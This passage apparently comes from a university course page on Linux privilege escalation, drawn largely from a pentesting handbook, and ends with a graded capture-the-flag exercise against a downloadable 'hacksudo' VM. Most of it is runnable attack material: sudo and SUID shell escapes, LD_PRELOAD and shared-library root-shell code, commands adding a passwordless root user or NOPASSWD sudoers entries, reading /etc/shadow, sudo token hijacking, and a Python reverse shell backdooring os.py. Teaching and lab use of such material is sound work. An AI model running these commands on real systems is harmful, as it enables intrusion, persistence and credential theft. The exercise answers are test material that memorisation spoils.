-L 2>/dev/null; cat /etc/iptables/* | grep -v \"^#\" | grep -Pv \"\\W*\\#\" 2>/dev/null) #Files used by network services lsof -i Open ports Always check network services running on the machine that you wasn't able to interact with before accessing to it: (netstat -punta || ss --ntpu) (netstat -punta || ss --ntpu) | grep \"127.0\" Sniffing Check if you can sniff traffic. If you can, you could be able to grab some credentials. timeout 1 tcpdump Users Generic Enumeration Check who you are, which privileges do you have, which users are in the systems, which ones can login and which ones have root privileges: #Info about me id || (whoami && groups) 2>/dev/null #List all users cat /etc/passwd | cut -d: -f1 #List users with console cat /etc/passwd | grep \"sh$\" #List superusers awk -F: '($3 == \"0\") {print}' /etc/passwd #Currently logged users w #Login history last | tail #Last log of each user lastlog #List all users and their groups for i in $(cut -d\":\" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort #Current user PGP keys gpg --list-keys 2>/dev/null Big UID Some Linux versions were affected by a bug that allow users with UID > INT_MAX to escalate privileges. More info: here , here and here . Exploit it using: systemd-run -t /bin/bash Groups Check if you are a member of some group that could grant you root privileges: https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe Clipboard Check if anything interesting is located inside the clipboard (if possible) if [ `which xclip 2>/dev/null` ]; then echo \"Clipboard: \"`xclip -o -selection clipboard 2>/dev/null` echo \"Highlighted text: \"`xclip -o 2>/dev/null` elif [ `which xsel 2>/dev/null` ]; then echo \"Clipboard: \"`xsel -ob 2>/dev/null` echo \"Highlighted text: \"`xsel -o 2>/dev/null` else echo \"Not found xsel and xclip\" fi Password Policy grep \"^PASS_MAX_DAYS\\|^PASS_MIN_DAYS\\|^PASS_WARN_AGE\\|^ENCRYPT_METHOD\" /etc/login.defs Known passwords If you know any password of the environment try to login as each user using the password. Su Brute If don't mind about doing a lot of noise and su and timeout binaries are present on the computer you can try to brute-force user using su-bruteforce . Linpeas with -a parameter also try to brute-force users. Writable PATH abuses $PATH If you find that you can write inside some folder of the $PATH you may be able to escalate privileges by creating a backdoor inside the writable folder with the name of some command that is going to be executed by a different user (root ideally) and that is not loaded from a folder that is located previous to your writable folder in $PATH. SUDO and SUID You could be allowed to execute some command using sudo or they could have the suid bit. Check it using: sudo -l #Check commands you can execute with sudo find / -perm -4000 2>/dev/null #Find all SUID binaries Some unexpected commands allows you to read and/or write files or even execute command. For example: sudo awk 'BEGIN {system(\"/bin/sh\")}' sudo find /etc -exec sh -i \\; sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh sudo tar c a.tar -I ./runme.sh a ftp>!/bin/sh less>! <shell_comand> NOPASSWD Sudo configuration might allow a user to execute some command with another user privileges without knowing the password. $ sudo -l User demo may run the following commands on crashlab: (root) NOPASSWD: /usr/bin/vim In this example the user demo can run vim as root , it is now trivial to get a shell by adding an ssh key into the root directory or by calling sh . sudo vim -c '!sh' SETENV This directive allows the user to set an environment variable while executing something: $ sudo -l User waldo may run the following commands on admirer: (ALL) SETENV: /opt/scripts/admin_tasks.sh This example, based on HTB machine Admirer , was vulnerable to PYTHONPATH hijacking in order to load an arbitrary python library while executing the script as root: sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh Sudo execution bypassing paths Jump to read other files or use symlinks . For example in sudeores file: hacker10 ALL= (root) /bin/less /var/log/ * sudo less /var/logs/anything less>:e /etc/shadow #Jump to read other files using privileged less ln /etc/shadow /var/log/new sudo less /var/log/new #Use symlinks to read any file If a wilcard is used (*), it is even easier: sudo less /var/log/../../etc/shadow #Read shadow sudo less /var/log/something /etc/shadow #Red 2 files Countermeasures : https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/ Sudo command/SUID binary without command path If the sudo permission is given to a single command without specifying the path : hacker10 ALL= (root) less you can exploit it by changing the PATH variable export PATH=/tmp:$PATH #Put your backdoor in /tmp and name it \"less\" sudo less This technique can also be used if a suid binary executes another command without specifying the path to it (always check with strings the content of a weird SUID binary) . Payload examples to execute. SUID binary with command path If the suid binary executes another command specifying the path , then, you can try to export a function named as the command that the suid file is calling. For example, if a suid binary calls /usr/sbin/service apache2 start you have to try to create the function and export it: function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; } export -f /usr/sbin/service Then, when you call the suid binary, this function will be executed LD_PRELOAD LD_PRELOAD is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library. To avoid this mechanism being used as an attack vector for suid/sgid executable binaries, the loader ignores LD_PRELOAD if ruid != euid . For such binaries, only libraries in standard paths that are also suid/sgid will be preloaded. If you find inside the output of sudo -l the sentence: env_keep+=LD_PRELOAD and you can call some command with sudo, you can escalate privileges. Defaults env_keep += LD_PRELOAD Save as /tmp/pe.c #include <stdio.h> #include <sys/types.h> #include <stdlib.h> void _init() { unsetenv(\"LD_PRELOAD\"); setgid(0); setuid(0); system(\"/bin/bash\"); } Then compile it using: cd /tmp gcc -fPIC -shared -o pe.so pe.c -nostartfiles Finally, escalate privileges running sudo LD_PRELOAD=pe.so <COMMAND> #Use any command you can run with sudo SUID Binary \u2013 so injection If you find some weird binary with SUID permissions, you could check if all the .so files are loaded correctly . In order to do so you can execute: strace <SUID-BINARY> 2>&1 | grep -i -E \"open|access|no such file\" For example, if you find something like: pen(\u201c/home/user/.config/libcalc.so\u201d, O_RDONLY) = -1 ENOENT (No such file or directory) you can exploit it. Create the file /home/user/.config/libcalc.c with the code: #include <stdio.h> #include <stdlib.h> static void inject() __attribute__((constructor)); void inject(){ system(\"cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p\"); } Compile it using: gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c And execute the binary. GTFOBins GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions. The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks. gdb -nx -ex '!sh' -ex quit sudo mysql -e '! /bin/sh' strace -o /dev/null /bin/sh sudo awk 'BEGIN {system(\"/bin/sh\")}' https://gtfobins.github.io/ FallOfSudo If you can access sudo -l you can use the tool FallOfSudo to check if it finds how to exploit any sudo rule. Reusing Sudo Tokens In the scenario where you have a shell as a user with sudo privileges but you don't know the password of the user, you can wait him to execute some command using sudo . Then, you can access the token of the session where sudo was used and use it to execute anything as sudo (privilege escalation). Requirements to escalate privileges: You already have a shell as user \" sampleuser \" \" sampleuser \" have used sudo to execute something in the last 15mins (by default that's the duration of the sudo token that allows to use sudo without introducing any password) cat /proc/sys/kernel/yama/ptrace_scope is 0 gdb is accessible (you can be able to upload it) (You can temporarily enable ptrace_scope with echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope or permanently modifying /etc/sysctl.d/10-ptrace.conf and setting kernel.yama.ptrace_scope = 0 ) If all these requirements are met, you can escalate privileges using: https://github.com/nongiach/sudo_inject The first exploit ( exploit.sh ) will create the binary activate_sudo_token in /tmp . You can use it to activate the sudo token in your session (you won't get automatically a root shell, do sudo su ): bash exploit.sh /tmp/activate_sudo_token sudo su The second exploit ( exploit_v2.sh ) will create a sh shell in /tmp owned by root with setuid bash exploit_v2.sh /tmp/sh -p The third exploit ( exploit_v3.sh ) will create a sudoers file that makes sudo tokens eternal and allows all users to use sudo bash exploit_v3.sh sudo su /var/run/sudo/ts/ If you have write permissions in the folder or on any of the created files inside the folder you can use the binary write_sudo_token to create a sudo token for a user and PID . For example if you can overwrite the file /var/run/sudo/ts/sampleuser and you have a shell as that user with PID 1234, you can obtain sudo privileges without needing to know the password doing: ./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser /etc/sudoers, /etc/sudoers.d The file /etc/sudoers and the files inside /etc/sudoers.d configure who can use sudo and how. This files by default can only be read by user root and group root . If you can read this file you could be able to obtain some interesting information , and if you can write any file you will be able to escalate privileges . ls -l /etc/sudoers /etc/sudoers.d/ ls -ld /etc/sudoers.d/ If you can write you can abuse this permissions echo \"$(whoami) ALL=(ALL) NOPASSWD: ALL\" >> /etc/sudoers echo \"$(whoami) ALL=(ALL) NOPASSWD: ALL\" >> /etc/sudoers.d/README Other way to abuse these permissions: # makes it so every terminal can sudo echo \"Defaults !tty_tickets\" > /etc/sudoers.d/win # makes it so sudo never times out echo \"Defaults timestamp_timeout=-1\" >> /etc/sudoers.d/win DOAS There are some alternatives to the sudo binary such as doas for OpenBSD, remember to check its configuration at /etc/doas.conf permit nopass demo as root cmd vim Sudo Hijacking If you know that a user usually connects to a machine and uses sudo to escalate privileges and you got a shell within that user context, you can create a new sudo executable that will execute your code as root and then the users command. Then, modify the $PATH of the user context (for example adding the new path in .bash_profile) so we the user executed sudo, your sudo executable is executed. Note that if the user uses a different shell (not bash) you will need to modify other files to add the new path. For example sudo-piggyback modifies ~/.bashrc , ~/.zshrc , ~/.bash_profile . You can find another example in bashdoor.py Shared Library ld.so The file /etc/ld.so.conf indicates where are loaded the configurations files from . Typically, this file contains the following path: include /etc/ld.so.conf.d/*.conf That means that the configuration files from /etc/ld.so.conf.d/*.conf will be read. This configuration files points to another folders where libraries are going to be searched for. For example, the content of /etc/ld.so.conf.d/libc.conf is /usr/local/lib . This means that the system will search for libraries inside /usr/local/lib . If for some reason a user has write permissions on any of the paths indicated: /etc/ld.so.conf , /etc/ld.so.conf.d/ , any file inside /etc/ld.so.conf.d/ or any folder indicated inside any config file inside /etc/ld.so.conf.d/*.conf he may be able to escalate privileges. Take a look about how to exploit this misconfiguration in the following page: https://book.hacktricks.xyz/linux-unix/privilege-escalation/ld.so.conf-example RPATH level15@nebula:/home/flag15$ readelf -d flag15 | egrep \"NEEDED|RPATH\" 0x00000001 (NEEDED) Shared library: [libc.so.6] 0x0000000f (RPATH) Library rpath: [/var/tmp/flag15] level15@nebula:/home/flag15$ ldd ./flag15 linux-gate.so.1 => (0x0068c000) libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000) /lib/ld-linux.so.2 (0x005bb000) By copying the lib into /var/tmp/flag15/ it will be used by the program in this place as specified in the RPATH variable. level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/ level15@nebula:/home/flag15$ ldd ./flag15 linux-gate.so.1 => (0x005b0000) libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000) /lib/ld-linux.so.2 (0x00737000) Then create an evil library in /var/tmp with gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6 #include<stdlib.h> #define SHELL \"/bin/sh\" int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) { char *file = SHELL; char *argv[] = {SHELL,0}; setresuid(geteuid(),geteuid(), geteuid()); execve(file,argv,0); } Capabilities Linux capabilities provide a subset of the available root privileges to a process . This effectively breaks up root privileges into smaller and distinctive units . Each of these units can then be independently be granted to processes. This way the full set of privileges is reduced and decreasing the risks of exploitation. Read the following page to learn more about capabilities and how to abuse them : https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities Directory permissions In a directory the bit for execute implies that the user affected can \" cd \" into the folder. The read bit implies the user can list the files , and the write bit implies the user can delete and create new files . ACLs ACLs are a second level of discretionary permissions, that may override the standard ugo/rwx ones. When used correctly they can grant you a better granularity in setting access to a file or a directory , for example by giving or denying access to a specific user that is neither the file owner, nor in the group owner (from here ). Give user \"kali\" read and write permissions over a file: setfacl -m u:kali:rw file.txt Get files with specific ACLs from the system: getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null Open shell sessions In old versions you may hijack some shell session of a different user ( root ). In newest versions you will be able to connect to screen sessions only of your own user . However, you could find interesting information inside of the session . screen sessions hijacking List screen sessions screen -ls Attach to a session screen -dr <session> #The -d is to detacche whoever is attached to it screen -dr 3350.foo #In the example of the image tmux sessions hijacking Apparently this was a problem with old tmux versions . I wasn't able to hijack a tmux (v2.1) session created by root from a non-privileged user. List tmux sessions tmux ls ps aux | grep tmux #Search for tmux consoles not using default folder for sockets tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess Attach to a session tmux attach -t myname #If you write something in this session it will appears in the other opened one tmux attach -d -t myname #First detach the sessinos from the other console and then access it yourself tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket Check valentine box from HTB for an example. SSH Debian OpenSSL Predictable PRNG - CVE-2008-0166 All SSL and SSH keys generated on Debian-based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug. This bug caused that when creating in those OS a new ssh key only 32,768 variations were possible . This means that all the possibilities can be calculated and having the ssh public key you can search for the corresponding private key . You can find the calculated possibilities here: https://github.com/g0tmi1k/debian-ssh SSH Interesting configuration values PasswordAuthentication: Specifies whether password authentication is allowed. The default is no . PubkeyAuthentication: Specifies whether public key authentication is allowed. The default is yes . PermitEmptyPasswords : When password authentication is allowed, it specifies whether the server allows login to accounts with empty password strings. The default is no . PermitRootLogin Specifies whether root can log in using ssh, default is no . Possible values: yes : root can login using password and private key without-password or prohibit-password : root can only login with private key forced-commands-only : Root can login only using privatekey cand if the commands options is specified no : no AuthorizedKeysFile Specifies files that contains the public keys that can be used for user authentication. I can contains tokens like %h , that will be replaced by the home directory. You can indicate absolute paths (starting in / ) or relative paths from the users home . For example: AuthorizedKeysFile .ssh/authorized_keys access That configuration will indicate that if you try to login with the private key of the user \" testusername \" ssh is going to compare the public key of your key with the ones located in /home/testusername/.ssh/authorized_keys and /home/testusername/access ForwardAgent/AllowAgentForwarding SSH agent forwarding allows you to use your local SSH keys instead of leaving keys (without passphrases!) sitting on your server. So, you will be able to jump via ssh to a host and from there jump to another host using the key located in your initial host . You need to set this option in $HOME/.ssh.config like this: Host example.com ForwardAgent yes Notice that if Host is * every time the user jumps to a different machine that host will be able to access the keys (which is a security issue). The file /etc/ssh_config can override this options and allow or denied this configuration. The file /etc/sshd_config can allow or denied ssh-agent forwarding with the keyword AllowAgentForwarding (default is allow). If you Forward Agent configured in an environment check here how to exploit it to escalate privileges . Interesting Files Profiles files The file /etc/profile and the files under /etc/profile.d/ are scripts that are executed when a user run a new shell . Therefore, if you can write or modify any of the you can escalate privileges . ls -l /etc/profile /etc/profile.d/ If any weird profile script is found you should check it for sensitive details . Passwd/Shadow Files Depending on the OS the /etc/passwd and /etc/shadow files may be using a different name or there may be a backup. Therefore it's recommended find all of hem and check if you can read them and check if there are hashes inside the files: #Passwd equivalent files cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null #Shadow equivalent files cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null In some occasions you can find password hashes inside the /etc/passwd (or equivalent) file grep -v '^[^:]*:[x\\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null Writable /etc/passwd First generate a password with one of the following commands. openssl passwd -1 -salt hacker hacker mkpasswd -m SHA-512 hacker python2 -c 'import crypt; print crypt.crypt(\"hacker\", \"$6$salt\")' Then add the user hacker and add the generated password. hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash E.g: hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash You can now use the su command with hacker:hacker Alternatively you can use the following lines to add a dummy user without a password. WARNING: you might degrade the current security of the machine. echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd su - dummy NOTE: In BSD platforms /etc/passwd is located at /etc/pwd.db and /etc/master.passwd , also the /etc/shadow is renamed to /etc/spwd.db . You should check if you can write in some sensitive file . For example, can you write to some service configuration file ? find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody for g in `groups`; do find \\( -type f -or -type d \\) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user For example, if the machine is running a tomcat server and you can modify the Tomcat service configuration file inside /etc/systemd/, then you can modify the lines: ExecStart=/path/to/backdoor User=root Group=root Your backdoor will be executed the next time that tomcat is started. Check Folders The following folders may contain backups or interesting information: /tmp , /var/tmp , /var/backups, /var/mail, /var/spool/mail, /etc/exports, /root (Probably you won't be able to read the last one but try) ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root Weird Location/Owned files #root owned files in /home folders find /home -user root 2>/dev/null #Files owned by other users in folders owned by me for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \\; 2>/dev/null; done #Files owned by root, readable by me but no world readable find / -type f -user root ! -perm -o=r 2>/dev/null #Files owned by me or world writable find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path \"/proc/*\" ! -path \"/sys/*\" ! -path \"$HOME/*\" 2>/dev/null #Writable files by each group I belong to for g in `groups`; do printf \" Group $g:\\n\"; find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path \"/proc/*\" ! -path \"/sys/*\" ! -path \"$HOME/*\" 2>/dev/null done done Modified files in last mins find / -type f -mmin -5 ! -path \"/proc/*\" ! -path \"/sys/*\" ! -path \"/run/*\" ! -path \"/dev/*\" ! -path \"/var/lib/*\" 2>/dev/null Sqlite DB files find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files fils=`find / -type f \\( -name \"*_history\" -o -name \".sudo_as_admin_successful\" -o -name \".profile\" -o -name \"*bashrc\" -o -name \"httpd.conf\" -o -name \"*.plan\" -o -name \".htpasswd\" -o -name \".git-credentials\" -o -name \"*.rhosts\" -o -name \"hosts.equiv\" -o -name \"Dockerfile\" -o -name \"docker-compose.yml\" \\) 2>/dev/null`Hidden files Hidden files find / -type f -iname \".*\" -ls 2>/dev/null Script/Binaries in PATH for d in `echo $PATH | tr \":\" \"\\n\"`; do find $d -name \"*.sh\" 2>/dev/null; done for d in `echo $PATH | tr \":\" \"\\n\"`; do find $d -type -f -executable 2>/dev/null; done Web files ls -alhR /var/www/ 2>/dev/null ls -alhR /srv/www/htdocs/ 2>/dev/null ls -alhR /usr/local/www/apache22/data/ ls -alhR /opt/lampp/htdocs/ 2>/dev/null Backups find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \\( -name \"*backup*\" -o -name \"*\\.bak\" -o -name \"*\\.bck\" -o -name \"*\\.bk\" \\) 2>/dev/nulll Known files containing passwords Read the code of linPEAS , it searches for several possible files that could contain passwords . Other interesting tool that you can use to do so is: LaZagne which is an open source application used to retrieve lots of passwords stored on a local computer for Windows, Linux & Mac. Logs If you can read logs, you may be able to find interesting/confidential information inside of them . The more strange the log is, the more interesting will be (probably). Also, some \" bad \" configured (backdoored?) audit logs may allow you to record passwords inside audit logs as explained in this post: https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/. aureport --tty | grep -E \"su |sudo \" | sed -E \"s,su|sudo,${C}[1;31m&${C}[0m,g\" grep -RE 'comm=\"su\"|comm=\"sudo\"' /var/log* 2>/dev/null In order to read logs the group adm will be really helpful. Shell files ~/.bash_profile # if it exists, read once when you log in to the shell ~/.bash_login # if it exists, read once if .bash_profile doesn't exist ~/.profile # if it exists, read once if the two above don't exist /etc/profile # only read if none of the above exist ~/.bashrc # if it exists, read every time you start a new shell ~/.bash_logout # if it exists, read when the login shell exits ~/.zlogin #zsh shell ~/.zshrc #zsh shell Generic Creds Search/Regex You should also check for files containing the word \" password \" in it's name or inside the content , also check for IPs and emails inside logs, or hashes regexps. I'm not going to list here how to do all of this but if you are interested you can check the last checks that linpeas perform. Writable files Python library hijacking If you know from where a python script is going to be executed and you can write inside that folder or you can modify python libraries , you can modify the os library and backdoor it (if you can write where python script is going to be executed, copy and paste the os.py library). To backdoor the library just add at the end of the os.py library the following line (change IP and PORT): import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.14\",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]); Logrotate exploitation There is a vulnerability on logrotate that allows a user with write permissions over a log file or any of its parent directories to make logrotate write a file in any location . If logrotate is being executed by root , then the user will be able to write any file in /etc/bash_completion.d/ that will be executed by any user that login. So, if you have write perms over a log file or any of its parent folder , you can privesc (on most linux distributions, logrotate is executed automatically once a day as user root ). Also, check if apart of /var/log there are more files being rotated . This vulnerability affects logrotate version 3.15.1 and below More detailed information about the vulnerability can be found in this page: https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition. You can exploit this vulnerability with logrotten . This vulnerability is very similar to CVE-2016-1247 (nginx logs), so whenever you find that you can alter logs, check who is managing those logs and check if you can escalate privileges substituting the logs by symlinks. /etc/sysconfig/network-scripts/ (Centos/Redhat) If, for whatever reason, a user is able to write an ifcf-<whatever> script to /etc/sysconfig/network-scripts or it can adjust an existing one, then your system is pwned . Network scripts, ifcg-eth0 for example are used for network connections. The look exactly like .INI files. However, they are ~~sourced~~ on Linux by Network Manager (dispatcher.d). In my case, the NAME= attributed in these network scripts is not handled correctly. If you have white/blank space in the name the system tries to execute the part after the white/blank space . Which means; everything after the first blank space is executed as root . For example: /etc/sysconfig/network-scripts/ifcfg-1337 NAME=Network /bin/id ONBOOT=yes DEVICE=eth0 ( Note the black space between Network and /bin/id ) Vulnerability reference: https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f init, init.d, systemd, and rc.d /etc/init.d contains scripts used by the System V init tools (SysVinit). This is the traditional service management package for Linux , containing the init program (the first process that is run when the kernel has finished initializing\u00b9) as well as some infrastructure to start and stop services and configure them. Specifically, files in /etc/init.d are shell scripts that respond to start , stop , restart , and (when supported) reload commands to manage a particular service. These scripts can be invoked directly or (most commonly) via some other trigger (typically the presence of a symbolic link in /etc/rc?.d/ ). (From here ) Other alternative to this folder is /etc/rc.d/init.d in Redhat /etc/init contains configuration files used by Upstart . Upstart is a young service management package championed by Ubuntu. Files in /etc/init are configuration files telling Upstart how and when to start , stop , reload the configuration, or query the status of a service. As of lucid, Ubuntu is transitioning from SysVinit to Upstart, which explains why many services come with SysVinit scripts even though Upstart configuration files are preferred. In fact, the SysVinit scripts are processed by a compatibility layer in Upstart. (From here ) systemd is a Linux initialization system and service manager that includes features like on-demand starting of daemons , mount and automount point maintenance, snapshot support, and processes tracking using Linux control groups. systemd provides a logging daemon and other tools and utilities to help with common system administration tasks. (From here ) Files that ships in packages downloaded from distribution repository go into /usr/lib/systemd/ . Modifications done by system administrator (user) go into /etc/systemd/system/ . Other Tricks NFS Privilege escalation https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe Escaping from restricted Shells https://book.hacktricks.xyz/linux-unix/privilege-escalation/escaping-from-limited-bash Cisco - vmanage https://book.hacktricks.xyz/linux-unix/privilege-escalation/cisco-vmanage Kernel Security Protections https://github.com/a13xp0p0v/kconfig-hardened-check https://github.com/a13xp0p0v/linux-kernel-defence-map More help Static impacket binaries Linux/Unix Privesc Tools Best tool to look for Linux local privilege escalation vectors: LinPEAS LinEnum : https://github.com/rebootuser/LinEnum(-t option) Enumy : https://github.com/luke-goddard/enumy Unix Privesc Check: http://pentestmonkey.net/tools/audit/unix-privesc-check Linux Priv Checker: www.securitysift.com/download/linuxprivchecker.py BeeRoot: https://github.com/AlessandroZ/BeRoot/tree/master/Linux Kernelpop: Enumerate kernel vulns ins linux and MAC https://github.com/spencerdodd/kernelpop Mestaploit: multi/recon/local_exploit_suggester Linux Exploit Suggester: https://github.com/mzet-/linux-exploit-suggester EvilAbigail (physical access): https://github.com/GDSSecurity/EvilAbigail Recopilation of more scripts : https://gh-dark.rauchg.now.sh/1N3/PrivEsc/tree/master/linux Bibliography https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ https://payatu.com/guide-linux-privilege-escalation/ https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744 http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html https://touhidshaikh.com/blog/?p=827 https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf https://github.com/frizb/Linux-Privilege-Escalation https://github.com/lucyoa/kernel-exploits https://github.com/rtcrowley/linux-private-i Exercise (10 pt) Hacksudo In this challenge, you need to download the following virtual machine to finish the challenges. The box was created with Virtualbox . Upon booting up use netdiscover tool to find the IP address. This is the target address based on whatever settings you have. You should verify the address just in case. You don't need to answer all questions in order. Skip some questions may not affect the next steps. Download: https://mega.nz/file/ix9VnA7Y#7LM1LXBta_kAeNrajXGkQhmwfbr5fIaQHykkWEPBjZY Mirror: https://pan.baidu.com/s/1D-YEa6cr3rcWXv49HgZtSw (Code: 1337) Setup Environment setup should use VirtualBox history version (VirtualBox 6.1.28 has a bug with Hyper-V, I used VirtualBox 6.0.24 and worked properly). You should setup Network as the following: The virtual image should enter the following promption: Debian GNU/Linux 10 hacksudo fog tty1 eth0: 192.168.xx.xxx hacksudo login: _ The second line is the ip address of virtual machine. Open your web browser, you can find this page in VM's ip address: You are done with configuration, now you can hack the machine and solve the challenges! If the ip address hasn't shown up, you can find it as below: Open you terminal (powershell.exe in Windows), and use ipconfig /all to find your Host-only NET ip address. Use any tool to scan the ip 192.168.xx.0/24 and you can find the virtual machine ip address. Otherwise, you can also use arp -a to find your Host-only Network address, and usually VM's ip address is followed. (1 pt) Port scan After the port scan, you should find several services running in the box. What's the version of the mysql service? Answer: x.x.x-xx.x.xx-MariaDB-x+debxxxx (replace all x to your answer) Hint: you can use nmap for port scanning. (1 pt) Web source code Access the website on port 80 . You can find here's some hint for the subsequent steps. What's the GitHub repo address you found in the source code? Answer: https://github.com/xxxxxxxx/xxxxxxxxxxx (replace all x to your answer) Hint: press F12 on the keyboard to open the Developer's Tools to view the source code (may vary for different browsers). (1 pt) Web directory discover Using web directory scanning, you can find a txt file under the website. What's the name of this txt file? Answer: xxxx.txt (replace all x to your answer) Hint: gobuster and dirbuster are both good web directory/file discovery tools. (1 pt) CMS vulnerability The CMS used in the website is CMS-MadeSimple . However, this CMS can be vulnerable in some versions. What's the version of CMS? Answer: x.x.x (replace all x to your answer) Hint: you can use whatweb to find out the version of services. (1 pt) Exploit CMS Now, using the vulnerability to find the username and the hashed password of the CMS. It's hard to break the hash string, but you can use this username to break other services on the server. The txt file you found above would help you to get the password for the ftp service on port 21 . What's the password (in plain text)? Answer: xxxxxx (replace all x to your answer) Hint: hydra is a widely used tool for password cracking. (1 pt) FTP and unzip Using the previous username and password, you can log into the FTP server. You may notice there's a zip file on the server. You need to break the password of the zip file. What's the password for the zip file? Answer: xxxxxx (replace all x to your answer) Hint: to crack the password of the zip files, you can check JohnTheRipper. (1 pt) Caesar Cipher After extracting the hacksudoSTEGNO.wav , you need to find what's inside this file. Recall what you've got till now, and find the CMS password. What's the password for CMS? Answer: xxxxxxxxxxxx (replace all x to your answer) Hint: CyberChef contains many useful cryptography tools. (1 pt) Upload RCE script You've got the CMS! Now you can enjoy accessing all website pages and put your files on the website. Why not let us dig deeper? Upload a PHP script to give you shell access. What's the first line of flag2.txt on the server? Answer: xxx xxxxxxxxxxxx xxxxx xxx xxx xxx xxxxx xxxxxx!!! (replace all x to your answer) Hint: here are some upload limits on the server. Find out how to bypass them. Hint: after uploading your RCE script, you can generate a reversed shell to get a pty shell (which would simplify your next steps). (1 pt) Local privilege escalation User isro is your first target. Attack and switch to user isro . View the files of isro . What's the content of user.txt ? Answer: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx (replace all x to your answer) Hint: /etc/shadow is a sensitive file and may contain a user hashed password. (1 pt) Root privilege escalation The final step: get root privilege. What's the content in the root.txt ? Answer: flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx} (replace all x to your answer) Hint: sudo has some suid things and you should take a look at them.","title":"Week10 PWN: Privilege Escalation"},{"location":"CS315/Week%2010/#week10-pwn-privilege-escalation","text":"","title":"Week10 PWN: Privilege Escalation"},{"location":"CS315/Week%2010/#system-information","text":"","title":"System Information"},{"location":"CS315/Week%2010/#os-info","text":"Let's starting gaining some knowledge of the OS running (cat /proc/version || uname -a ) 2>/dev/null lsb_release -a 2>/dev/null","title":"OS info"},{"location":"CS315/Week%2010/#path","text":"If you have write permissions on any folder inside the PATH variable you may be able to hijacking some libraries or binaries: echo $PATH","title":"Path"},{"location":"CS315/Week%2010/#env-info","text":"Interesting information, passwords or API keys in the environment variables? (env || set) 2>/dev/null","title":"Env info"},{"location":"CS315/Week%2010/#kernel-exploits","text":"Check the kernel version and if there is some exploit that can be used to escalate privileges cat /proc/version uname -a searchsploit \"Linux Kernel\" You can find a good vulnerable kernel list and some already compiled exploits here: https://github.com/lucyoa/kernel-exploits and exploitdb sploits . Other sites where you can find some compiled exploits : https://github.com/bwbwbwbw/linux-exploit-binaries, https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack To extract all the vulnerable kernel versions from that web you can do: curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep \"Kernels: \" | cut -d \":\" -f 2 | cut -d \"<\" -f 1 | tr 